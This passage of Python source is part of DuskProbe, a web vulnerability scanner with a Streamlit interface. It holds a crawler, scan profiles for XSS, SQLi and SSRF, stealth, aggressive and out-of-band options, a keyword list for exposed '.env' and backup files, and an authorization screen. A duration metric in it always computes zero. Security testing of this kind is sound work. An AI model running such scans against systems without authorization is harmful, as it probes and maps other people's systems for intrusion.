                details.append(f"⚡ [bold red]JavaScript Security Issues:[/bold red]")
                for js_issue in js_issues[:3]:  # Show top 3
                    details.append(f"   • {js_issue}")
            
            if details:
                # Truncate URL for title
                display_url = url if len(url) <= 60 else url[:57] + "..."
                risk_score = vuln_data.get('risk_score', 0)
                
                detail_panel = Panel(
                    '\n'.join(details),
                    title=f"[bold red]🚨 High-Risk URL Details (Risk: {risk_score}%) - {display_url}[/bold red]",
                    expand=False,
                    border_style="red"
                )
                self.console.print(detail_panel)

    def _generate_structure_analysis_summary(self, structure_data: Dict) -> str:
        """Generate summary of website structure analysis"""
        summary_parts = []
        
        # URL discovery summary
        discovered_urls = structure_data.get('discovered_urls', [])
        crawl_stats = structure_data.get('crawl_statistics', {})
        
        if len(discovered_urls) > 100:
            summary_parts.append(f"🗺️ [bold blue]EXTENSIVE MAPPING:[/bold blue] {len(discovered_urls)} URLs discovered - comprehensive site coverage")
        elif len(discovered_urls) > 30:
            summary_parts.append(f"🗺️ [bold blue]THOROUGH MAPPING:[/bold blue] {len(discovered_urls)} URLs mapped")
        
        # Robots.txt findings
        robots_analysis = structure_data.get('robots_analysis', {})
        interesting_findings = robots_analysis.get('interesting_findings', [])
        if interesting_findings:
            summary_parts.append(f"🚨 [bold red]ROBOTS.TXT DISCLOSURE:[/bold red] {len(interesting_findings)} sensitive path(s) exposed")
        
        # Directory enumeration findings
        directory_enum = structure_data.get('directory_enumeration', {})
        interesting_files = directory_enum.get('interesting_files', [])
        if interesting_files:
            sensitive_files = [f for f in interesting_files if any(keyword in f['url'].lower() for keyword in ['config', 'backup', 'admin', '.env'])]
            if sensitive_files:
                summary_parts.append(f"🚨 [bold red]CRITICAL FILE EXPOSURE:[/bold red] {len(sensitive_files)} sensitive file(s) accessible")
        
        # Subdomain findings
        subdomain_enum = structure_data.get('subdomain_enumeration', {})
        interesting_subdomains = subdomain_enum.get('interesting_subdomains', [])
        if interesting_subdomains:
            summary_parts.append(f"⚠️ [bold yellow]HIGH-RISK SUBDOMAINS:[/bold yellow] {len(interesting_subdomains)} critical subdomain(s) found")
        
        # Per-URL vulnerability summary
        per_url_data = structure_data.get('per_url_vulnerabilities', {})
        if per_url_data:
            high_risk_count = sum(1 for data in per_url_data.values() if data.get('risk_score', 0) >= 50)
            total_analyzed = len([data for data in per_url_data.values() if 'error' not in data])
            
            if high_risk_count > 0:
                summary_parts.append(f"🚨 [bold red]HIGH-RISK URLS:[/bold red] {high_risk_count}/{total_analyzed} URLs require immediate attention")
        
        if not summary_parts:
            summary_parts.append("✅ [bold green]Website structure analysis completed - comprehensive mapping successful[/bold green]")
        
        return '\n'.join(summary_parts)


# --- Main Execution Logic ---

async def simple_crawl(session: AsyncSession, url: str, max_depth: int = 1) -> Set[str]:
    """Crawl a website to find links, asynchronously."""
    links = set()
    queue = asyncio.Queue()
    await queue.put((url, 0))
    processed_urls = {url}
    
    while not queue.empty():
        current_url, depth = await queue.get()
        if depth > max_depth:
            continue
        
        links.add(current_url)
        status, _, content, _ = await session.get(current_url)
        if status != 200 or not content:
            continue

        base_url = f"{urlparse(current_url).scheme}://{urlparse(current_url).netloc}"
        if BS4_AVAILABLE:
            soup = BeautifulSoup(content, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = urljoin(base_url, link['href'].split('#')[0])
                if urlparse(href).netloc == urlparse(base_url).netloc and href not in processed_urls:
                    await queue.put((href, depth + 1))
                    processed_urls.add(href)
    return links

async def run_scan(config: DuskProbeConfig, url: str, progress, task_id):
    """Coroutine to run a complete scan on a single URL."""
    async with AsyncSession(config) as session:
        checker = SecurityChecker(session, config)
        scan_results = await checker.full_check(url, progress, task_id)
        return scan_results

class StreamlitArgs:
    """Streamlit-compatible arguments container."""
    def __init__(self):
        self.url = None
        self.batch = None
        self.output = None
        self.format = 'json'
        self.config = None
        self.crawl = False
        self.output_dir = './reports'
        self.log_dir = './logs'
        self.tor = False
        self.verbose = False
        self.quiet = False

def display_professional_footer():
    """Display professional footer with completion message and contact information."""
    console.print("\n")
    console.print("[bold black on white]" + "="*80 + "[/bold black on white]")
    console.print()
    console.print("[bold red]                        🎯 SCAN COMPLETED SUCCESSFULLY 🎯[/bold red]")
    console.print()
    console.print("[bold black]                     Thank you for using DuskProbe Scanner[/bold black]")
    console.print("[bold black]                   Your security assessment is now complete[/bold black]")
    console.print()
    console.print("[bold red]Star Repository:[/bold red] [bold black]Please star us at https://github.com/la-b-ib/DuskProbe[/bold black]")
    console.print("[bold red]Updates:[/bold red]         [bold black]Check for latest version at https://github.com/la-b-ib/DuskProbe[/bold black]")
    console.print("[bold red]Contact:[/bold red]         [bold black]labib-x@protonmail.com[/bold black]")
    console.print("[bold red]Security:[/bold red]        [bold black]Use responsibly and only on authorized targets[/bold black]")
    console.print()
    console.print("[bold black]                © 2025 Labib Bin Shahed. All rights reserved.[/bold black]")
    console.print("[bold black]           Professional Security Testing | Ethical Hacking | Research[/bold black]")
    console.print()
    console.print("[bold black on white]" + "="*80 + "[/bold black on white]")
    console.print("\n")

async def run_scan_async(urls_to_scan, config, progress_container, status_container, stats_container):
    """Run async scan with real-time Streamlit progress updates."""
    all_results = []
    scan_stats = {
        'total_requests': 0,
        'vulnerabilities_found': 0,
        'start_time': datetime.now(),
        'current_url': '',
        'scanned_urls': 0,
        'total_urls': len(urls_to_scan)
    }
    
    for idx, url in enumerate(urls_to_scan):
        scan_stats['scanned_urls'] = idx + 1
        scan_stats['current_url'] = url
        
        # Update progress bar
        progress_pct = (idx) / len(urls_to_scan)
        progress_container.progress(progress_pct, f"Scanning {idx+1}/{len(urls_to_scan)}: {url[:50]}...")
        
        # Update status
        elapsed = (datetime.now() - scan_stats['start_time']).seconds
        status_container.info(f"⏱️ Elapsed: {elapsed}s | 🎯 Target: {url[:60]}")
        
        async with AsyncSession(config) as session:
            checker = SecurityChecker(session, config)
            
            # Enhanced progress tracker with live updates
            class StreamlitProgress:
                def __init__(self, stats_dict, stats_display):
                    self.stats = stats_dict
                    self.stats_display = stats_display
                
                def update(self, task_id, **kwargs):
                    if 'completed' in kwargs:
                        self.stats['total_requests'] += 1
                        # Update stats display
                        self.stats_display.metric(
                            "Total Requests", 
                            self.stats['total_requests'],
                            delta=f"{self.stats['scanned_urls']}/{self.stats['total_urls']} URLs"
                        )
                
                def add_task(self, description, total):
                    return 0
            
            progress = StreamlitProgress(scan_stats, stats_container)
            scan_results = await checker.full_check(url, progress, 0)
            
            if scan_results and 'findings' in scan_results:
                scan_stats['vulnerabilities_found'] += len(scan_results['findings'])
            
            all_results.append(scan_results)
    
    progress_container.progress(1.0, "✅ Scan complete!")
    final_elapsed = (datetime.now() - scan_stats['start_time']).seconds
    status_container.success(f"✅ Scan completed in {final_elapsed}s | Found {scan_stats['vulnerabilities_found']} vulnerabilities")
    
    return all_results, scan_stats

def main():
    """Streamlit web application main function with advanced features."""
    # Page configuration
    st.set_page_config(
        page_title="DuskProbe Security Scanner",
        page_icon="🔍",
        layout="wide",
        initial_sidebar_state="expanded"
    )
    
    # Initialize session state
    if 'scan_history' not in st.session_state:
        st.session_state.scan_history = []
    if 'current_results' not in st.session_state:
        st.session_state.current_results = None
    if 'scan_profiles' not in st.session_state:
        st.session_state.scan_profiles = {
            'Quick Scan': {'crawl': False, 'verbose': False, 'checks': ['xss', 'sqli']},
            'Full Scan': {'crawl': True, 'verbose': True, 'checks': 'all'},
            'OWASP Top 10': {'crawl': False, 'verbose': True, 'checks': ['xss', 'sqli', 'auth', 'xxe', 'ssrf']},
            'API Security': {'crawl': False, 'verbose': True, 'checks': ['jwt', 'graphql', 'idor', 'cors']}
        }
    if 'custom_payloads' not in st.session_state:
        st.session_state.custom_payloads = {}
    if 'advanced_config' not in st.session_state:
        st.session_state.advanced_config = {
            'rate_limit': 10,
            'retry_attempts': 3,
            'custom_headers': {},
            'auth_type': 'None',
            'auth_credentials': {},
            'proxy_enabled': False,
            'proxy_url': '',
            'user_agents': [],
            'cookies': {},
            'scan_depth': 3,
            'follow_redirects': True,
            'verify_ssl': True,
            'timeout': 30,
            'max_threads': 10
        }
    if 'api_keys' not in st.session_state:
        st.session_state.api_keys = {
            'shodan': '',
            'censys_id': '',
            'censys_secret': '',
            'urlscan': '',
            'virustotal': '',
            'alienvault': ''
        }
    if 'comparison_mode' not in st.session_state:
        st.session_state.comparison_mode = False
    if 'selected_scans_for_comparison' not in st.session_state:
        st.session_state.selected_scans_for_comparison = []
    if 'terms_accepted' not in st.session_state:
        st.session_state.terms_accepted = False
    if 'disclaimer_read' not in st.session_state:
        st.session_state.disclaimer_read = False
    
    # ==================== TERMS & CONDITIONS AGREEMENT SCREEN ====================
    if not st.session_state.terms_accepted or not st.session_state.disclaimer_read:
        # Apply JetBrains Mono Bold font (scoped to text to avoid UI conflicts)
        st.markdown("""
            <style>
            @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap');

            :root {
                --dp-font-stack: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace, 'Apple Color Emoji', 'Segoe UI Emoji', 'Noto Color Emoji';
            }

            /* Textual content */
            .stApp, .stAppViewContainer, .main, .block-container,
            .stMarkdown, .stCaption, p, h1, h2, h3, h4, h5, h6, label {
                font-family: var(--dp-font-stack) !important;
                font-weight: 700 !important;
            }

            /* Interactive controls */
            button, input, select, textarea, .stTextInput, .stTextArea, .stSelectbox, .stRadio, .stCheckbox {
                font-family: var(--dp-font-stack) !important;
                font-weight: 600 !important;
            }

            input::placeholder, textarea::placeholder {
                font-weight: 400 !important;
                opacity: 0.75;
            }

            /* Tabs on the terms screen if any */
            .stTabs [data-baseweb="tab-list"] button {
                font-family: var(--dp-font-stack) !important;
                font-weight: 600 !important;
            }

            /* Do not override icon glyphs */
            svg, [role="img"] { font-family: initial !important; }
            </style>
        """, unsafe_allow_html=True)
        
        st.title("🔍 DUSKPROBE")
        st.markdown("### Web Application Vulnerability Assessment Tool")
        st.caption("Version 5.0.0 · Developed by Labib Bin Shahed")

        st.warning("⚠️ Authorized use only. Review the obligations below before launching any scans.")

        summary_col1, summary_col2 = st.columns(2)
        with summary_col1:
            st.markdown("#### What You Must Have")
            st.markdown(
                """
                - ✅ Written authorization from the system owner
                - ✅ Defined scope, timeline, and escalation contacts
                - ✅ Awareness of the laws that apply to your engagement
                """
            )
        with summary_col2:
            st.markdown("#### Your Responsibilities")
            st.markdown(
                """
                - 🔒 Stay within the approved scope at all times
                - 🧾 Handle evidence and data securely and confidentially
                - 📣 Follow responsible disclosure with the asset owner
                """
            )

        st.markdown("#### Legal Highlights")
        st.info(
            """
            - Unauthorized scanning may breach CFAA, Computer Misuse Act, GDPR, and similar laws worldwide.
            - All activity is performed under **your** authorization; misuse is solely your liability.
            - DuskProbe is delivered **as-is** with no warranty and no assumption of responsibility by the developer.
            """
        )

        st.markdown("#### Confirmation Checklist")
        agreement_col1, agreement_col2 = st.columns(2)
        with agreement_col1:
            disclaimer_check = st.radio(
                "I read and understood the legal disclaimer",
                ["No", "Yes"],
                key="disclaimer_checkbox",
                horizontal=True
            ) == "Yes"
            terms_check = st.radio(
                "I accept the terms and conditions",
                ["No", "Yes"],
                key="terms_checkbox",
                horizontal=True
            ) == "Yes"
        with agreement_col2:
            authorization_check = st.radio(
                "I have written authorization for my targets",
                ["No", "Yes"],
                key="authorization_checkbox",
                horizontal=True
            ) == "Yes"
            responsibility_check = st.radio(
                "I accept full legal responsibility for my use",
                ["No", "Yes"],
                key="responsibility_checkbox",
                horizontal=True
            ) == "Yes"

        st.markdown("---")
        button_col1, button_col2, button_col3 = st.columns([1, 2, 1])
        with button_col2:
            if all([disclaimer_check, terms_check, authorization_check, responsibility_check]):
                if st.button("🚀 I understand and agree — enter DuskProbe", type="primary", use_container_width=True):
                    st.session_state.terms_accepted = True
                    st.session_state.disclaimer_read = True
                    st.success("Access granted. Loading the console…")
                    st.balloons()
                    st.rerun()
            else:
                st.button(
                    "Complete all confirmations to continue",
                    type="secondary",
                    disabled=True,
                    use_container_width=True
                )

        st.stop()
    
    # ==================== MAIN APPLICATION (After Terms Acceptance) ====================
    
    # ========== SIDEBAR ==========
    with st.sidebar:
        st.title("🔍 DuskProbe")
        
        # Target Configuration
        st.markdown("### 🎯 Target Configuration")
        input_method = st.radio(
            "Input Method",
            ["Single URL", "Multiple URLs", "Upload File"],
            help="Choose how to provide target URLs",
            key="sidebar_input_method"
        )
        
        if input_method == "Single URL":
            url_input = st.text_input(
                "Target URL",
                placeholder="https://example.com",
                help="Enter the target URL to scan",
                key="sidebar_url_main"
            )
            batch_urls = ""
        elif input_method == "Multiple URLs":
            batch_urls = st.text_area(
                "Batch URLs",
                placeholder="https://example1.com\nhttps://example2.com",
                help="Enter multiple URLs, one per line",
                height=100,
                key="sidebar_batch_urls"
            )
            url_input = ""
        else:
            uploaded_file = st.file_uploader(
                "Upload URL list",
                type=['txt', 'csv'],
                help="Upload a file containing URLs",
                key="sidebar_file_upload"
            )
            url_input = ""
            batch_urls = ""
            if uploaded_file:
                content = uploaded_file.read().decode('utf-8')
                batch_urls = content
        
        st.markdown("---")
        
        # Scan Profile
        st.markdown("### ⚙️ Scan Profile")
        selected_profile = st.radio(
            "Choose Profile",
            list(st.session_state.scan_profiles.keys()) + ["Custom"],
            help="Pre-configured scan profiles",
            key="sidebar_profile",
            horizontal=True
        )
        
        if selected_profile != "Custom":
            profile = st.session_state.scan_profiles[selected_profile]
            st.caption(f"Crawl: {'✅' if profile['crawl'] else '❌'} | Verbose: {'✅' if profile['verbose'] else '❌'}")
            enable_crawl = profile['crawl']
            verbose = profile['verbose']
        else:
            enable_crawl = st.checkbox("Enable Crawling", key="sidebar_crawl")
            verbose = st.checkbox("Verbose Output", key="sidebar_verbose")
        
        report_format = st.radio(
            "Report Format",
            ["json", "csv", "html", "text"],
            help="Select output format",
            key="sidebar_report_format",
            horizontal=True
        )
        
        st.markdown("---")
        
        # Quick Stats
        if st.session_state.current_results:
            st.metric("Active Scans", 1 if st.session_state.current_results else 0)
            all_findings = []
            for result in st.session_state.current_results.get('results', []):
                if result and 'findings' in result:
                    all_findings.extend(result['findings'])
            st.metric("Total Findings", len(all_findings))
            critical = len([f for f in all_findings if f.get('severity') == 'CRITICAL'])
            st.metric("Critical Issues", critical, delta="High Priority" if critical > 0 else None)
        
        st.markdown("---")
        st.caption("© 2025 Labib Bin Shahed")
    
    # Header
    st.title("🔍 DUSKPROBE")
    st.markdown("### Web Application Vulnerability Assessment Tool")
    
    # Custom Font - JetBrains Mono Bold
    st.markdown("""
        <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap');
        
        :root {
            --dp-font-stack: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace, 'Apple Color Emoji', 'Segoe UI Emoji', 'Noto Color Emoji';
        }

        /* App shell and textual content */
        .stApp, .stAppViewContainer, .main, .block-container,
        .stMarkdown, .stCaption, p, h1, h2, h3, h4, h5, h6, label {
            font-family: var(--dp-font-stack) !important;
            font-weight: 700 !important;
        }

        /* Interactive controls: keep family, slightly lighter weight for layout stability */
        button, input, select, textarea, .stTextInput, .stTextArea, .stSelectbox, .stRadio, .stCheckbox {
            font-family: var(--dp-font-stack) !important;
            font-weight: 600 !important;
        }

        /* Placeholders */
        input::placeholder, textarea::placeholder {
            font-weight: 400 !important;
            opacity: 0.75;
        }

        /* Metrics */
        .stMetricLabel, .stMetricValue, .stMetricDelta {
            font-family: var(--dp-font-stack) !important;
            font-weight: 700 !important;
        }

        /* Tab labels */
        .stTabs [data-baseweb="tab-list"] button {
            font-family: var(--dp-font-stack) !important;
            font-weight: 600 !important;
        }

        /* Sidebar text */
        [data-testid="stSidebar"] * {
            font-family: var(--dp-font-stack) !important;
        }

        /* Do not override icon glyphs */
        svg, [role="img"] {
            font-family: initial !important;
        }
        
        /* Hide any debug/keyboard parameter text */
        [data-testid="stExpander"]::before,
        [data-testid="stExpander"]::after {
            content: none !important;
            display: none !important;
        }
        
        /* Ensure proper z-index for expanders */
        [data-testid="stExpander"] {
            position: relative;
            z-index: 1;
            background: transparent;
            overflow: hidden; /* prevent underlying text from bleeding through */
        }
        
        /* Make expander header opaque and above content */
        [data-testid="stExpander"] details > summary {
            position: relative;
            z-index: 2;
            background-color: inherit !important; /* match page background (light/dark) */
        }
        
        /* Ensure expander content stacks below header cleanly */
        [data-testid="stExpander"] details[open] > div,
        [data-testid="stExpander"] > div {
            position: relative;
            z-index: 1;
            background-color: inherit !important;
        }
        
        /* Extra safety: hide any ghost labels possibly injected via pseudo elements */
        [data-testid="stExpander"] *::before,
        [data-testid="stExpander"] *::after {
            pointer-events: none;
        }
        
        /* Hide any stray text elements */
        .element-container:empty::before,
        .element-container:empty::after {
            display: none !important;
        }
        </style>
    """, unsafe_allow_html=True)
    
    # Tabbed navigation - REORGANIZED: 6 main tabs
    tab1, tab2, tab3, tab4, tab5, tab6 = st.tabs([
        "🎯 Scanner", 
        "📊 Results & Analytics",
        "📉 Statistics Dashboard",
        "🕵️ Reconnaissance",
        "⚙️ Configuration",
        "💾 Export & Reports"
    ])
    
    # ========== TAB 1: SCANNER ==========
    with tab1:
        st.subheader("🎯 Scan Execution")
        st.caption("Configure your scan in the sidebar, then start the scan below")
        
        # Get values from sidebar
        if 'sidebar_input_method' in st.session_state:
            if st.session_state.sidebar_input_method == "Single URL":
                url_input = st.session_state.get('sidebar_url_main', '')
                batch_urls = ""
            elif st.session_state.sidebar_input_method == "Multiple URLs":
                batch_urls = st.session_state.get('sidebar_batch_urls', '')
                url_input = ""
            else:
                batch_urls = st.session_state.get('sidebar_batch_urls', '')
                url_input = ""
        else:
            url_input = ""
            batch_urls = ""
        
        selected_profile = st.session_state.get('sidebar_profile', 'Quick Scan')
        if selected_profile != "Custom":
            profile = st.session_state.scan_profiles.get(selected_profile, st.session_state.scan_profiles['Quick Scan'])
            enable_crawl = profile['crawl']
            verbose = profile['verbose']
        else:
            enable_crawl = st.session_state.get('sidebar_crawl', False)
            verbose = st.session_state.get('sidebar_verbose', False)
        
        report_format = st.session_state.get('sidebar_report_format', 'json')
        
        # Combined Scan Parameters (includes Advanced Scan, Detection, and Configuration)
        with st.expander("⚙️ Scan Parameters", expanded=False):
            param_tabs = st.tabs(["🔧 Performance", "🎯 Detection", "🔐 Security", "⚙️ Configuration"])
            
            # Tab 1: Performance
            with param_tabs[0]:
                perf_col1, perf_col2, perf_col3 = st.columns(3)
                
                with perf_col1:
                    max_threads = st.number_input("Max Threads", min_value=1, max_value=100, value=st.session_state.advanced_config['max_threads'], help="Number of concurrent requests")
                    timeout = st.number_input("Timeout (seconds)", min_value=5, max_value=300, value=st.session_state.advanced_config['timeout'], help="Request timeout")
                    rate_limit = st.number_input("Rate Limit (req/s)", min_value=1, max_value=100, value=st.session_state.advanced_config['rate_limit'], help="Requests per second")
                    retry_attempts = st.number_input("Retry Attempts", min_value=0, max_value=10, value=st.session_state.advanced_config['retry_attempts'], help="Number of retry attempts")
                
                with perf_col2:
                    max_depth = st.number_input("Crawl Depth", min_value=1, max_value=20, value=st.session_state.advanced_config['scan_depth'], help="Maximum crawl depth")
                    follow_redirects = st.checkbox("Follow Redirects", value=st.session_state.advanced_config['follow_redirects'], help="Follow HTTP redirects", key="scanner_follow_redirects")
                    crawl_external = st.checkbox("Crawl External Links", value=False, help="Include external domains", key="scanner_crawl_external")
                    crawl_subdomains = st.checkbox("Crawl Subdomains", value=False, help="Include subdomains", key="scanner_crawl_subdomains")
                
                with perf_col3:
                    use_proxy = st.checkbox("Enable Proxy", value=st.session_state.advanced_config['proxy_enabled'])
                    if use_proxy:
                        proxy_url = st.text_input("Proxy URL", value=st.session_state.advanced_config['proxy_url'], placeholder="http://proxy:8080", help="Proxy server URL")
                        proxy_auth = st.text_input("Proxy Auth", placeholder="username:password", type="password", help="Proxy authentication")
            
            # Tab 2: Detection
            with param_tabs[1]:
                detect_col1, detect_col2, detect_col3 = st.columns(3)
                
                with detect_col1:
                    aggressive_mode = st.checkbox("Aggressive Mode", value=False, help="More thorough but noisier detection", key="scanner_aggressive_mode")
                    stealth_mode = st.checkbox("Stealth Mode", value=False, help="Slower, less detectable scanning", key="scanner_stealth_mode")
                    smart_detection = st.checkbox("Smart Detection", value=True, help="AI-enhanced detection patterns", key="scanner_smart_detection")
                    deep_analysis = st.checkbox("Deep Analysis", value=False, help="Comprehensive response analysis", key="scanner_deep_analysis")
                    
                with detect_col2:
                    use_custom_payloads = st.checkbox("Use Custom Payloads", value=False, help="Include custom payloads from Payloads tab", key="scanner_use_custom_payloads")
                    encode_payloads = st.checkbox("Encode Payloads", value=True, help="Use multiple encoding techniques", key="scanner_encode_payloads")
                    polyglot_payloads = st.checkbox("Polyglot Payloads", value=False, help="Use multi-context payloads", key="scanner_polyglot_payloads")
                    
                with detect_col3:
                    timing_analysis = st.checkbox("Timing Analysis", value=False, help="Blind vulnerability detection via timing", key="scanner_timing_analysis")
                    out_of_band = st.checkbox("Out-of-Band Detection", value=False, help="Use external callbacks for detection", key="scanner_out_of_band")
            
            # Tab 3: Security
            with param_tabs[2]:
                sec_col1, sec_col2 = st.columns(2)
                
                with sec_col1:
                    verify_ssl = st.checkbox("Verify SSL", value=st.session_state.advanced_config['verify_ssl'], help="Verify SSL certificates", key="scanner_verify_ssl")
                    user_agent = st.text_input("Custom User-Agent", value="", placeholder="Leave empty for default", help="Custom user agent string", key="scanner_user_agent")
                    cookie_string = st.text_input("Cookies", value="", placeholder="name1=value1; name2=value2", help="Custom cookies", key="scanner_cookies")
                    custom_headers = st.text_area(
                        "Custom Headers (JSON)",
                        value='{}',
                        placeholder='{"X-Custom-Header": "value"}',
                        help="JSON object with custom headers",
                        height=100,
                        key="scanner_custom_headers"
                    )
                
                with sec_col2:
                    auth_type = st.selectbox("Auth Type", ["None", "Basic", "Bearer Token", "API Key", "Custom Header"], help="Authentication method")
                    if auth_type == "Basic":
                        auth_username = st.text_input("Username", key="auth_user")
                        auth_password = st.text_input("Password", type="password", key="auth_pass")
                    elif auth_type == "Bearer Token":
                        auth_token = st.text_input("Token", type="password", key="auth_token")
                    elif auth_type == "API Key":
                        auth_key_name = st.text_input("Key Name", key="auth_key_name")
                        auth_key_value = st.text_input("Key Value", type="password", key="auth_key_val")
            
            # Tab 4: Configuration (moved from Advanced Config tab)
            with param_tabs[3]:
                config_col1, config_col2 = st.columns(2)
                
                with config_col1:
                    new_max_threads = st.number_input(
                        "Global Max Threads",
                        min_value=1,
                        max_value=200,
                        value=st.session_state.advanced_config['max_threads'],
                        help="Default concurrent requests"
                    )
                    new_scan_depth = st.number_input(
                        "Default Scan Depth",
                        min_value=1,
                        max_value=20,
                        value=st.session_state.advanced_config['scan_depth'],
                        help="Default crawl depth"
                    )
                    
                    if st.button("💾 Save Configuration"):
                        st.session_state.advanced_config['max_threads'] = new_max_threads
                        st.session_state.advanced_config['scan_depth'] = new_scan_depth
                        st.success("✅ Configuration saved!")
                
                with config_col2:
                    st.write("**API Status**")
                    if SHODAN_AVAILABLE:
                        st.success("✅ Shodan")
                    else:
                        st.error("❌ Shodan")
                    if CENSYS_AVAILABLE:
                        st.success("✅ Censys")
                    else:
                        st.error("❌ Censys")
        
        # Scan button
        st.markdown("---")
        scan_col1, scan_col2, scan_col3, scan_col4 = st.columns([2, 1, 1, 1])
        with scan_col1:
            scan_button = st.button("🚀 START SCAN", type="primary", use_container_width=True)
        with scan_col2:
            if st.button("🗑️ Clear Results", use_container_width=True):
                st.session_state.current_results = None
                st.rerun()
        with scan_col3:
            if st.button("📜 View History", use_container_width=True):
                st.session_state.show_history = True
                st.rerun()
        
        # Execute scan
        if scan_button:
            # Collect URLs
            urls_to_scan = set()
            if url_input and url_input.strip():
                urls_to_scan.add(url_input.strip())
            if batch_urls and batch_urls.strip():
                urls_to_scan.update([line.strip() for line in batch_urls.split('\n') if line.strip()])
            
            if not urls_to_scan:
                st.error("❌ Please provide at least one URL to scan")
            else:
                # Create args object
                args = StreamlitArgs()
                args.url = url_input if url_input else None
                args.format = report_format
                args.crawl = enable_crawl
                args.verbose = verbose
                config = DuskProbeConfig(args)
                
                # Display scan info
                st.success(f"🎯 Initiating scan for **{len(urls_to_scan)}** target(s)")
                
                # Create progress containers
                progress_container = st.empty()
                status_container = st.empty()
                
                # Stats columns
                stats_col1, stats_col2, stats_col3 = st.columns(3)
                with stats_col1:
                    stats_requests = st.empty()
                with stats_col2:
                    stats_time = st.empty()
                with stats_col3:
                    stats_speed = st.empty()
                
                # Run scan
                with st.spinner("🔄 Scanning in progress..."):
                    all_results, scan_stats = asyncio.run(
                        run_scan_async(
                            list(urls_to_scan), 
                            config, 
                            progress_container,
                            status_container,
                            stats_requests
                        )
                    )
                
                # Store results in session state
                scan_record = {
                    'timestamp': datetime.now(),
                    'targets': list(urls_to_scan),
                    'results': all_results,
                    'stats': scan_stats,
                    'profile': selected_profile
                }
                st.session_state.scan_history.append(scan_record)
                st.session_state.current_results = scan_record
                
                st.success("✅ Scan completed successfully!")
                st.balloons()
        
        # ========== SCAN HISTORY (MOVED TO SCANNER TAB) ==========
        st.markdown("---")
        st.subheader("📚 Scan History")
        
        if st.session_state.scan_history:
            st.info(f"Total scans in history: **{len(st.session_state.scan_history)}**")
            
            # History controls
            hist_col1, hist_col2 = st.columns([4, 1])
            with hist_col2:
                if st.button("🗑️ Clear History", use_container_width=True):
                    st.session_state.scan_history = []
                    st.rerun()
            
            # Display history in reverse chronological order
            for idx, scan in enumerate(reversed(st.session_state.scan_history), 1):
                all_scan_findings = []
                for result in scan['results']:
                    if result and 'findings' in result:
                        all_scan_findings.extend(result['findings'])
                
                scan_critical = len([f for f in all_scan_findings if f.get('severity') == 'CRITICAL'])
                scan_high = len([f for f in all_scan_findings if f.get('severity') == 'HIGH'])
                scan_medium = len([f for f in all_scan_findings if f.get('severity') == 'MEDIUM'])
                scan_low = len([f for f in all_scan_findings if f.get('severity') == 'LOW'])
                
                with st.expander(
                    f"🕐 {scan['timestamp'].strftime('%Y-%m-%d %H:%M:%S')} | "
                    f"Profile: {scan['profile']} | "
                    f"Targets: {len(scan['targets'])} | "
                    f"Findings: {len(all_scan_findings)} "
                    f"(🔴{scan_critical} 🟠{scan_high} 🟡{scan_medium} 🟢{scan_low})"
                ):
                    hist_detail_col1, hist_detail_col2 = st.columns([2, 1])
                    
                    with hist_detail_col1:
                        st.markdown("**📌 Targets:**")
                        for target in scan['targets']:
                            st.markdown(f"• `{target}`")
                    
                    with hist_detail_col2:
                        st.markdown("**📊 Summary:**")
                        st.markdown(f"• Total: {len(all_scan_findings)}")
                        st.markdown(f"• 🔴 Critical: {scan_critical}")
                        st.markdown(f"• 🟠 High: {scan_high}")
                        st.markdown(f"• 🟡 Medium: {scan_medium}")
                        st.markdown(f"• 🟢 Low: {scan_low}")
                    
                    if st.button(f"📂 Load This Scan", key=f"load_{idx}"):
                        st.session_state.current_results = scan
                        st.success("✅ Scan loaded! Switch to Results & Analytics tab to view.")
        else:
            st.info("📭 No scan history available yet. Complete a scan to see it here.")
    
    # ========== TAB 2: RESULTS & ANALYTICS (WITH DATA TABLE INTEGRATED) ==========
    with tab2:
        if st.session_state.current_results:
            results = st.session_state.current_results
            all_results = results['results']
            scan_stats = results['stats']
            
            # Aggregate findings
            all_findings = []
            for result in all_results:
                if result and 'findings' in result:
                    all_findings.extend(result['findings'])
            
            # Top metrics
            st.subheader("📈 Scan Summary")
            metric_col1, metric_col2, metric_col3, metric_col4, metric_col5 = st.columns(5)
            
            critical_count = len([f for f in all_findings if f.get('severity') == 'CRITICAL'])
            high_count = len([f for f in all_findings if f.get('severity') == 'HIGH'])
            medium_count = len([f for f in all_findings if f.get('severity') == 'MEDIUM'])
            low_count = len([f for f in all_findings if f.get('severity') == 'LOW'])
            total_count = len(all_findings)
            
            with metric_col1:
                st.metric("🔴 Critical", critical_count)
            with metric_col2:
                st.metric("🟠 High", high_count)
            with metric_col3:
                st.metric("🟡 Medium", medium_count)
            with metric_col4:
                st.metric("🟢 Low", low_count)
            with metric_col5:
                st.metric("📊 Total", total_count)
            
            # Risk score calculation
            risk_score = (critical_count * 10) + (high_count * 7) + (medium_count * 4) + (low_count * 1)
            if risk_score > 50:
                risk_level = "🔴 CRITICAL"
                risk_color = "red"
            elif risk_score > 30:
                risk_level = "🟠 HIGH"
                risk_color = "orange"
            elif risk_score > 10:
                risk_level = "🟡 MEDIUM"
                risk_color = "yellow"
            else:
                risk_level = "🟢 LOW"
                risk_color = "green"
            
            st.markdown("---")
            risk_col1, risk_col2, risk_col3 = st.columns(3)
            with risk_col1:
                st.metric("🎯 Risk Score", risk_score)
            with risk_col2:
                st.markdown(f"**Risk Level:** {risk_level}")
            with risk_col3:
                elapsed = (scan_stats.get('start_time', datetime.now()) - scan_stats.get('start_time', datetime.now())).seconds if 'start_time' in scan_stats else 0
                st.metric("⏱️ Scan Duration", f"{elapsed}s")
            
            # Visualization section
            st.markdown("---")
            st.subheader("📊 Vulnerability Distribution")
            
            if all_findings:
                # Create visualization data
                viz_col1, viz_col2 = st.columns(2)
                
                with viz_col1:
                    # Severity distribution
                    st.markdown("**By Severity**")
                    severity_data = {
                        'Severity': ['Critical', 'High', 'Medium', 'Low'],
                        'Count': [critical_count, high_count, medium_count, low_count]
                    }
                    st.bar_chart(severity_data, x='Severity', y='Count', use_container_width=True)
                
                with viz_col2:
                    # Vulnerability type distribution
                    st.markdown("**By Type**")
                    type_counts = {}
                    for f in all_findings:
                        vtype = f.get('type', 'Unknown')
                        type_counts[vtype] = type_counts.get(vtype, 0) + 1
                    
                    if type_counts:
